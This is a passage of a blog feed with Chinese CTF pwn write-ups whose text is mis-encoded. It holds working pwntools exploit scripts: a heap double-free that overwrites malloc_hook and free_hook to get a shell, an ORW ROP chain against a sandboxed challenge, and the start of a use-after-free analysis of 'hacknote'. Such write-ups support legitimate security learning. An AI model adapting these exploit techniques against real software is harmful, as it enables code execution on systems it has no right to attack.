keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./heap'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'heap'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'data: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'delete: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">'leak_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_addr<span class="token number">-0x3c4b78</span>success<span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>__free_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__free_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'system_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 4</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># delete 2 and 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 5</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># free chunk3</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># double free chunk3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 4</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'cccc'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 5</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__free_hook_addr<span class="token number">-0xb58</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="V-amp-N2020-å…¬å¼€èµ›-easyTHeap"><a href="#V-amp-N2020-å…¬å¼€èµ›-easyTHeap" class="headerlink" title="[V&amp;N2020 å…¬å¼€èµ›]easyTHeap"></a>[V&amp;N2020 å…¬å¼€èµ›]easyTHeap</h2><p>è€ƒå¯Ÿç‚¹:tcacheè¡¨å¤´æ”»å‡»<br>ç®€ç•¥è¯´ä¸€ä¸‹å§ï¼Œtcacheç»“æ„ä½“å­˜åœ¨äºheapåŒºåŸŸï¼Œtcacheåˆ°tcache+0x50å¤„æ˜¯å„ä¸ªtcacheçš„å¤§å°ï¼Œå‰©ä¸‹çš„åŒºåŸŸä¸­å­˜å‚¨ç€å„ä¸ªtcacheçš„åœ°å€ï¼Œ<br>ç¨‹åºå­˜åœ¨dobule freeï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡double freeæ³„éœ²heapåœ°å€ï¼Œè¿›è€ŒçŸ¥é“tcacheåœ°å€ï¼Œç„¶åä¿®æ”¹å“åº”å¤§å°çš„tcacheæŒ‡å‘çš„åœ°å€ï¼Œå°±å¯ä»¥ä»»æ„åœ°å€å†™äº†<br>ä¹‹åçš„æ”»å‡»å°±æ˜¯æ­£å¸¸çš„åˆ©ç”¨one_gadgetåˆ†é…åˆ°malloc_hookä¸Šï¼Œå³å¯getshell</p><h2 id="V-amp-N2020-å…¬å¼€èµ›-warmup"><a href="#V-amp-N2020-å…¬å¼€èµ›-warmup" class="headerlink" title="[V&amp;N2020 å…¬å¼€èµ›]warmup"></a>[V&amp;N2020 å…¬å¼€èµ›]warmup</h2><p>è€ƒå¯Ÿç‚¹ï¼šorwæ”»å‡»å’Œå¯¹æ ˆç©ºé—´çš„ç†è§£<br>åŒæ ·ç®€ç•¥è¯´ä¸€ä¸‹ï¼Œç¨‹åºå¼€å¯äº†æ²™ç®±ï¼Œç¦ç”¨äº†exceveå’Œsystemï¼Œè¿™æ ·æˆ‘ä»¬å°±æ— æ³•getshellï¼Œåªèƒ½é€šè¿‡orwæ”»å‡»è¯»å–flag<br>è€Œè¿™ä¸ªç¨‹åºçš„mainå‡½æ•°åˆæ˜¯ä¸ªå¥—å¨ƒ<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/45.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/46.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/47.jpg" alt=""><br>ç¬¬ä¸€æ¬¡è¾“å…¥æ— æº¢å‡ºï¼Œç¬¬äºŒæ¬¡è¾“å…¥å­˜åœ¨0x10å­—èŠ‚çš„æº¢å‡ºï¼Œåˆšå¥½æº¢å‡ºåˆ°ripï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„æ ˆå¸§æ˜¯ä½äºå‰ä¸€ä¸ªå‡½æ•°ä¸Šæ–¹çš„ï¼Œæˆ‘ä»¬åªéœ€åœ¨ripå¤„<br>ç”¨retè¯­å¥è¿æ¥ä¸¤ä¸ªæ ˆå¸§å³å¯æ‰§è¡Œç¬¬ä¸€æ¬¡è¯»å…¥çš„å†…å®¹ï¼Œæˆ‘ä»¬çš„æ”»å‡»æ€è·¯å°±æ˜¯ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¾“å…¥ä¸­è¾“å…¥orwçš„ropé“¾(ç”±äºç¨‹åºå¼€å¯äº†PIEï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨libcä¸­çš„gadget)ï¼Œç¬¬äºŒæ¬¡ç›´æ¥æº¢å‡ºåˆ°ripï¼Œä½¿ç”¨retè¿æ¥ä¸¤ä¸ªæ ˆæ¡¢å³å¯</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># io = process('./vn_pwn_warmup')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25013</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x21102</span>pop_rsi_ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x202e8</span>pop_rdx_ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x01b92</span>ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x937</span>read_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>write_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>open_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x3c6500</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name?'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/flag\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †å­¦ä¹ è®°å½•</title>
      <link href="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/"/>
      <url>/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>å¤§éƒ¨åˆ†é¢˜ç›®éƒ½é€‰è‡ªHITCON Training</p><h2 id="UAFæ¼æ´-use-after-free"><a href="#UAFæ¼æ´-use-after-free" class="headerlink" title="UAFæ¼æ´(use after free)"></a>UAFæ¼æ´(use after free)</h2><p>é¡¾åæ€ä¹‰ï¼ŒUAFæ¼æ´çš„æ„æ€å°±æ˜¯åœ¨chunkè¢«freeä¹‹åä¾ç„¶èƒ½å¤Ÿä½¿ç”¨ï¼Œäº§ç”Ÿçš„åŸå› åœ¨äºä½¿ç”¨è¿‡å †å—ä¹‹åæ²¡æœ‰åŠæ—¶å°†å †å—çš„æŒ‡é’ˆç½®nullï¼Œå¯¼è‡´ä¸‹æ¬¡ç”³è¯·å†…å­˜çš„æ—¶å€™ä¾ç„¶èƒ½ç‹—ä½¿ç”¨è¯¥å †å—</p><a id="more"></a><p>çœ‹åˆ°é¢˜ç›®</p><h3 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h3><p>å…ˆchecksecèµ°ä¸€æ³¢<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/1.jpg" alt=""><br>32ä½æ–‡ä»¶ï¼Œåªå¼€äº†nxå’Œcanaryï¼Œpartial RELROæ„å‘³ç€gotè¡¨å¯æ”¹<br>è¿è¡Œä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/2.jpg" alt=""><br>å¢åˆ æŸ¥åŠŸèƒ½<br>æ¥ç€IDAåˆ†æ<br>å…ˆçœ‹åˆ°addåŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/3.jpg" alt=""><br>é¦–å…ˆmallocä¸€ä¸ª8å­—èŠ‚(å®é™…ä¸Šæ˜¯åˆ†é…äº†16å­—èŠ‚ï¼Œchunkå¤´ä¸¤ä¸ª4å­—èŠ‚ï¼ŒåŠ ä¸Šåˆ†é…çš„å…«å­—èŠ‚ä¸€å…±16ä¸ªå­—èŠ‚)<br>è¿™16ä¸ªå­—èŠ‚çš„åœ°å€å­˜åœ¨notelistè¿™ä¸ªæ•°ç»„ä¸­<br>æ¥ç€ï¼Œåœ¨è¿™16ä¸ªå­—èŠ‚å¤„ï¼Œå‰å…«ä¸ªå­—èŠ‚æ˜¯chunkå¤´ï¼Œæ¥ä¸‹æ¥çš„8ä¸ªå­—èŠ‚å­˜å…¥<code>print_note_content</code>å‡½æ•°æŒ‡é’ˆï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯æ‰“å°<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/4.jpg" alt=""><br>åå…«ä¸ªå­—èŠ‚å­˜å…¥æˆ‘ä»¬ç”³è¯·çš„sizeå¤§å°çš„å†…å­˜çš„åœ°å€</p><pre class=" language-c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_contentv0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å› æ­¤ï¼Œæ•´ä¸ªnoteçš„ç»“æ„å°±æ˜¯è¿™æ ·</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> note <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>printnote<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>å†çœ‹åˆ°printå‡½æ•°<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/5.jpg" alt=""><br>å…ˆè¾“å…¥åºå·ï¼Œåˆ¤æ–­åºå·æ˜¯å¦ç¬¦åˆï¼Œå¦‚æœç¬¦åˆçš„è¯ï¼Œå†åˆ¤æ–­<code>notelist[v1]</code>æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨çš„è¯å°±è°ƒç”¨<code>printnote()</code>å‡½æ•°æ‰“å°</p><p>å†çœ‹åˆ°deleteå‡½æ•°<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/6.jpg" alt=""></p><pre class=" language-c"><code class="language-c"><span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>freeå¹¶ä¸å½»åº•ï¼ŒæŒ‡é’ˆå¹¶æœªç½®nullï¼Œè¿™å°±æ˜¯æ¼æ´æ‰€åœ¨</p><p>å†™expä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå°è£…å¥½è¦ç”¨åˆ°çš„å‡ ä¸ªå‡½æ•°</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Note size :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>é¢˜ç›®ä¸­ç»™äº†ä¸€ä¸ªmagicå‡½æ•°<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/8.jpg" alt=""><br>çœå»äº†æˆ‘ä»¬æ³„éœ²libcåŸºåœ°å€ä»¥åŠæ„é€ shellçš„åŠŸå¤«<br>é‚£ä¹ˆï¼Œè¯¥æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªå‡½æ•°<br>ç»“åˆuafæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å°†printnoteä¸­è°ƒç”¨çš„print_note_contentå‡½æ•°æ›¿æ¢ä¸ºmagicå‡½æ•°ï¼Œè¿™æ ·å½“æˆ‘ä»¬è°ƒç”¨printnoteå‡½æ•°æ—¶ï¼Œå®é™…ä¸Šå°±æ˜¯è°ƒç”¨äº†magicå‡½æ•°<br>å¼€å§‹æ„é€ </p><p>é¦–å…ˆmallocä¸¤ä¸ªå †ï¼Œå¤§å°ä¸è¦ç­‰äºnoteç»“æ„ä½“çš„å¤§å°</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0å·</span>add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1å·</span></code></pre><p>ç„¶åå†freeæ‰è¿™ä¸¤ä¸ªå †ï¼Œå®é™…ä¸Šåˆ™æ˜¯freeæ‰äº†4ä¸ªå 